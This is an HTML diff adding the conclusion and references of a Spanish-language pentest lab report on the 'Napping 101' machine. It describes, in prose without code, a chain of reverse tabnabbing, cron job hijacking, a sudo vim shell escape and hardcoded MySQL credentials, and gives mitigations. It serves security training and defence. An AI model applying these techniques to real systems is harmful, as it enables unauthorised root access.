+            <div class="rm-item"><i class="fas fa-eye"></i>Pentesting trimestral</div>
+        </div>
+    </div>
+</section>
+
+<!-- ══ 15 CONCLUSIÓN ══ -->
+<section class="window">
+    <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+    <h2><i class="fas fa-flag-checkered"></i> 15 — Conclusión y Reflexión Técnica</h2>
+
+    <div class="concl-box green">
+        <h3>// CONCLUSIÓN EJECUTIVA</h3>
+        <p>La evaluación Red Team sobre <strong>Napping 101</strong> demostró un nivel de riesgo <strong>CRÍTICO</strong>. El sistema fue comprometido en su totalidad mediante una cadena de cuatro vulnerabilidades encadenadas que escalaron desde un ataque de ingeniería social web hasta el control total como <strong>root</strong>. Lo más significativo es que ninguna de las técnicas utilizadas fue avanzada: Reverse Tabnabbing, inyección en cron job, sudo misconfiguration y credenciales en texto plano son errores de configuración documentados y prevenibles con buenas prácticas básicas.</p>
+        <p>El servidor expone credenciales MySQL con sentencias destructivas en código fuente accesible por root, lo que en manos de un atacante real representaría la pérdida total de la base de datos de usuarios del portal, daño reputacional severo y posible cese de operaciones.</p>
+    </div>
+
+    <div class="concl-box orange">
+        <h3>// REFLEXIÓN TÉCNICA — APRENDIZAJES</h3>
+        <p>Este laboratorio es particularmente valioso porque demuestra que la seguridad de una aplicación web no termina en el código del servidor — el comportamiento del navegador y la gestión de pestañas también son vectores de ataque. <strong>Reverse Tabnabbing</strong> es una vulnerabilidad elegante que explota una característica legítima del navegador (<code style="color:#00ff66">window.opener</code>) para realizar phishing dirigido sin modificar el código de la víctima.</p>
+        <p>El <strong>cron job hijacking</strong> ilustra perfectamente el principio de menor privilegio: un archivo con permisos de escritura global ejecutado automáticamente por otro usuario es una bomba de tiempo. La mitigación es trivial (<code style="color:#00ff66">chmod 644</code>), pero el impacto de no aplicarla es devastador.</p>
+        <p>La misconfiguration de <strong>sudo con vim</strong> demuestra que delegar privilegios a herramientas interactivas es peligroso por diseño — vim, nano, less, python, perl y muchas otras herramientas permiten abrir un shell desde su interior. GTFOBins documenta cientos de binarios que pueden usarse para escape de privilegios. La regla es simple: si un binario puede ejecutar comandos arbitrarios, no debe tener sudo sin restricciones.</p>
+    </div>
+</section>
+
+<!-- ══ 16 REFERENCIAS + PDF ══ -->
+<section class="window">
+    <div class="window-bar"><span class="btn red"></span><span class="btn yellow"></span><span class="btn green"></span></div>
+    <h2><i class="fas fa-book"></i> 16 — Referencias Técnicas</h2>
+    <ul class="refs-list">
+        <li><i class="fas fa-external-link-alt"></i>OWASP — Reverse Tabnabbing · <a href="https://owasp.org/www-community/attacks/Reverse_Tabnabbing" target="_blank">owasp.org/www-community/attacks/Reverse_Tabnabbing</a></li>
+        <li><i class="fas fa-external-link-alt"></i>MDN Web Docs — window.opener y rel=noopener · <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel/noopener" target="_blank">developer.mozilla.org/docs/rel/noopener</a></li>
+        <li><i class="fas fa-external-link-alt"></i>GTFOBins — vim sudo escape · <a href="https://gtfobins.github.io/gtfobins/vim/#sudo" target="_blank">gtfobins.github.io/gtfobins/vim/#sudo</a></li>
+        <li><i class="fas fa-external-link-alt"></i>PTES — Penetration Testing Execution Standard · <a href="http://www.pentest-standard.org" target="_blank">pentest-standard.org</a></li>
+        <li><i class="fas fa-external-link-alt"></i>OWASP Testing Guide — Session Management Testing (WSTG-SESS)</li>
+        <li><i class="fas fa-external-link-alt"></i>CWE-250 — Execution with Unnecessary Privileges (sudo misconfiguration)</li>
+        <li><i class="fas fa-external-link-alt"></i>CWE-732 — Incorrect Permission Assignment for Critical Resource (cron job)</li>
+        <li><i class="fas fa-external-link-alt"></i>CWE-798 — Use of Hard-coded Credentials (hardcoded MySQL password)</li>
+        <li><i class="fas fa-external-link-alt"></i>Nmap Reference Guide · <a href="https://nmap.org/book/man.html" target="_blank">nmap.org/book/man.html</a></li>
+        <li><i class="fas fa-external-link-alt"></i>OWASP DirBuster Project · <a href="https://owasp.org/www-project-dirbuster/" target="_blank">owasp.org/www-project-dirbuster/</a></li>
+    </ul>
+
+    <div class="pdf-btn-wrap" style="margin-top:28px;">
+        <a href="actividad11.pdf" download>
+            <i class="fas fa-download"></i> DESCARGAR REPORTE PDF
+        </a>
+    </div>
+</section>
+
+</main>
+</body>
+</html>
